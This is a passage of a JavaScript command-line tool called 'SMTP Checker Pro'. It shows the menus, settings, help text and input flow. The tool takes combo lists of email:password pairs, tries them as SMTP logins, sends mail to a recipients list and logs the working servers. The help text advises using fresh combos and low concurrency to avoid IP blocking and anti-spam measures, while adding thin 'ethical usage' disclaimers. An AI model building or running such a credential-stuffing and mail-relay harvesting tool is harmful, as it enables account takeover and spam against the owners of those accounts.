  console.log(chalk.cyan("1. ") + chalk.white("Start SMTP Checking"));
  console.log(chalk.cyan("2. ") + chalk.white("Settings"));
  console.log(chalk.cyan("3. ") + chalk.white("View Statistics"));
  console.log(chalk.cyan("4. ") + chalk.white("Help"));
  console.log(chalk.cyan("5. ") + chalk.white("Exit") + "\n");
  
  const choice = await prompt(chalk.cyan("Enter your choice (1-5): "));
  return choice;
}

// Show settings menu
async function showSettingsMenu() {
  while (true) {
    printHeader();
    console.log(chalk.white.bold("⚙️ SETTINGS MENU") + "\n");
    console.log(chalk.cyan("1. ") + chalk.white(`Max Concurrent Operations: ${config.maxConcurrent}`));
    console.log(chalk.cyan("2. ") + chalk.white(`Test Mode: ${config.testMode ? 'Enabled' : 'Disabled'}`));
    console.log(chalk.cyan("3. ") + chalk.white(`Verbose Logging: ${config.verboseLogging ? 'Enabled' : 'Disabled'}`));
    console.log(chalk.cyan("4. ") + chalk.white(`Batch Size: ${config.batchSize}`));
    console.log(chalk.cyan("5. ") + chalk.white(`Retry Attempts: ${config.retryAttempts}`));
    console.log(chalk.cyan("6. ") + chalk.white(`Rate Limit Delay: ${config.rateLimitDelay}ms`));
    console.log(chalk.cyan("7. ") + chalk.white(`Ethical Mode: ${config.ethicalMode ? 'Enabled' : 'Disabled'}`));
    console.log(chalk.cyan("8. ") + chalk.white("Back to Main Menu") + "\n");
    
    const choice = await prompt(chalk.cyan("Enter setting to change (1-8): "));
    
    if (choice === '1') {
      const value = await prompt(chalk.cyan("Enter new max concurrent operations (1-20): "));
      const num = parseInt(value);
      if (!isNaN(num) && num >= 1 && num <= 20) {
        config.maxConcurrent = num;
      } else {
        console.log(chalk.red("Value must be between 1-20"));
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    } else if (choice === '2') {
      config.testMode = !config.testMode;
    } else if (choice === '3') {
      config.verboseLogging = !config.verboseLogging;
    } else if (choice === '4') {
      const value = await prompt(chalk.cyan("Enter new batch size (1-200): "));
      const num = parseInt(value);
      if (!isNaN(num) && num >= 1 && num <= 200) {
        config.batchSize = num;
      } else {
        console.log(chalk.red("Value must be between 1-200"));
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    } else if (choice === '5') {
      const value = await prompt(chalk.cyan("Enter new retry attempts (1-5): "));
      const num = parseInt(value);
      if (!isNaN(num) && num >= 1 && num <= 5) {
        config.retryAttempts = num;
      } else {
        console.log(chalk.red("Value must be between 1-5"));
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    } else if (choice === '6') {
      const value = await prompt(chalk.cyan("Enter new rate limit delay in ms (500-5000): "));
      const num = parseInt(value);
      if (!isNaN(num) && num >= 500 && num <= 5000) {
        config.rateLimitDelay = num;
      } else {
        console.log(chalk.red("Value must be between 500-5000"));
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    } else if (choice === '7') {
      config.ethicalMode = !config.ethicalMode;
    } else if (choice === '8') {
      break;
    } else {
      console.log(chalk.red("Invalid choice"));
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}

// Show help information
async function showHelp() {
  printHeader();
  console.log(chalk.white.bold("📚 HELP & INFORMATION") + "\n");
  
  console.log(chalk.cyan.bold("What is SMTP Checker Pro?"));
  console.log(chalk.white("SMTP Checker Pro is a tool for verifying SMTP credentials and testing email delivery."));
  console.log(chalk.white("It helps identify working SMTP servers for email accounts and tests their ability to send emails.\n"));
  
  console.log(chalk.cyan.bold("File Formats:"));
  console.log(chalk.white("1. Combo File: Text file with one email:password per line"));
  console.log(chalk.white("2. Recipients File: Text file with one email address per line\n"));
  
  console.log(chalk.cyan.bold("Output Files:"));
  console.log(chalk.white("1. smtp_valid.txt: Working SMTP servers"));
  console.log(chalk.white("2. smtp_errors.txt: Failed SMTP servers and errors"));
  console.log(chalk.white("3. smtp_log.txt: Detailed logs of all operations"));
  console.log(chalk.white("4. smtp_results.json: Comprehensive results in JSON format\n"));
  
  console.log(chalk.cyan.bold("Ethical Usage Guidelines:"));
  console.log(chalk.white("• Only test email accounts you own or have permission to test"));
  console.log(chalk.white("• Do not use this tool for sending unsolicited emails (spam)"));
  console.log(chalk.white("• Respect email service providers' terms of service"));
  console.log(chalk.white("• Be aware of and comply with relevant laws and regulations"));
  console.log(chalk.white("• Use rate limiting to avoid triggering anti-spam measures\n"));
  
  console.log(chalk.cyan.bold("Tips for Best Results:"));
  console.log(chalk.white("• Use fresh, valid email:password combinations"));
  console.log(chalk.white("• Start with a small number of concurrent operations (5-10) to avoid IP blocking"));
  console.log(chalk.white("• Enable Test Mode for initial validation without sending emails"));
  console.log(chalk.white("• Check logs for detailed error information"));
  console.log(chalk.white("• Some email providers require app-specific passwords or reduced security settings\n"));
  
  await prompt(chalk.cyan("Press Enter to return to the main menu..."));
}

// Start SMTP checking process
async function startSmtpCheck() {
  printHeader();
  console.log(chalk.white.bold("🚀 START SMTP CHECKING") + "\n");
  
  // Get input files
  const comboFile = await prompt(chalk.cyan("Enter path to combo file (email:password): "));
  const recipientFile = await prompt(chalk.cyan("Enter path to recipients file: "));
  
  // Validate files exist
  try {
    await fs.access(comboFile);
  } catch (err) {
    console.log(chalk.red(`❌ Combo file not found: ${comboFile}`));
    await prompt(chalk.cyan("\nPress Enter to return to the main menu..."));
    return;
  }
  
  try {
    await fs.access(recipientFile);
  } catch (err) {
    console.log(chalk.red(`❌ Recipients file not found: ${recipientFile}`));
    await prompt(chalk.cyan("\nPress Enter to return to the main menu..."));
    return;
  }
  
  // Get test email details
  const testEmail = await prompt(chalk.cyan("Enter email for SMTP testing: "));
  if (!validate(testEmail)) {
    console.log(chalk.red("❌ Invalid test email format"));
    await prompt(chalk.cyan("\nPress Enter to return to the main menu..."));
    return;
  }
  
  // Confirm settings
  console.log("\n" + "=".repeat(50));
  console.log(chalk.white.bold("📋 Configuration Summary:"));
  console.log(chalk.white(`• Combo File: ${comboFile}`));
  console.log(chalk.white(`• Recipients File: ${recipientFile}`));
  console.log(chalk.white(`• Test Email: ${testEmail}`));
  console.log(chalk.white(`• Max Concurrent Operations: ${config.maxConcurrent}`));
  console.log(chalk.white(`• Test Mode: ${config.testMode ? 'Enabled' : 'Disabled'}`));
  console.log(chalk.white(`• Batch Size: ${config.batchSize}`));
  console.log("=".repeat(50) + "\n");
  
  const confirm = await prompt(chalk.cyan("Start SMTP checking with these settings? (yes/no): "));
  if (confirm.toLowerCase() !== 'yes') {
    console.log(chalk.yellow("⚠️ Operation cancelled"));
    await prompt(chalk.cyan("\nPress Enter to return to the main menu..."));
    return;
  }
  
  // Reset statistics
  stats.totalEmails = 0;
  stats.validSmtp = 0;
  stats.failedSmtp = 0;
  stats.emailsSent = 0;
  stats.startTime = null;
  stats.endTime = null;
  stats.validDomains = new Set();
  stats.invalidDomains = new Set();
  
  // Start processing
  console.log(chalk.green("\n🚀 Starting SMTP checking process...\n"));
  await processComboList(comboFile, testEmail, recipientFile);
  
  await prompt(chalk.cyan("\nPress Enter to return to the main menu..."));
}

// Show statistics
async function showStatistics() {
  printHeader();
  console.log(chalk.white.bold("📊 STATISTICS") + "\n");
  
  printStats();
  
  // Show file statistics if available
  try {
    const validData = await fs.readFile(path.join(process.cwd(), 'logs', 'smtp_valid.txt'), 'utf8');
    const errorData = await fs.readFile(path.join(process.cwd(), 'logs', 'smtp_errors.txt'), 'utf8');
    
    const validCount = validData.split('\n').filter(line => line.trim()).length;
    const errorCount = errorData.split('\n').filter(line => line.trim()).length;
    
    console.log(chalk.white.bold("\nFile Statistics:"));
    console.log(chalk.white(`• Valid SMTP Entries: ${validCount}`));
    console.log(chalk.white(`• Error Entries: ${errorCount}`));
  } catch (err) {
    // Files might not exist yet
    console.log(chalk.yellow("\nNo file statistics available."));
  }
  
  await prompt(chalk.cyan("\nPress Enter to return to the main menu..."));
}

// Main function
async function main() {
  // Initialize
  const initialized = await initialize();
  if (!initialized) {
    console.log(chalk.red("Failed to initialize. Exiting."));
    process.exit(1);
  }
  
  // Show ethical warning if enabled
  if (config.ethicalMode) {
    await ethicalWarning();
  }
  
  // Main menu loop
  while (true) {
    const choice = await showMenu();
    
    if (choice === '1') {
      await startSmtpCheck();
    } else if (choice === '2') {
      await showSettingsMenu();
    } else if (choice === '3') {
      await showStatistics();
    } else if (choice === '4') {
      await showHelp();
    } else if (choice === '5') {
      console.log(chalk.green("\n✅ Thank you for using SMTP Checker Pro. Goodbye!"));
      break;
    } else {
      console.log(chalk.red("Invalid choice. Please try again."));
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}

// Handle errors
process.on('uncaughtException', async (err) => {
  console.log(chalk.red(`\n❌ Uncaught exception: ${err.message}`));
  await logError(`Uncaught exception: ${err.message}`);
  console.log(chalk.yellow("Please check logs for details."));
  process.exit(1);
});

// Start the program
(async () => {
  try {
    await main();
  } catch (err) {
    console.log(chalk.red(`\n❌ Unexpected error: ${err.message}`));
    await logError(`Unexpected error: ${err.message}`);
    console.log(chalk.yellow("Please check logs for details."));
  }
})();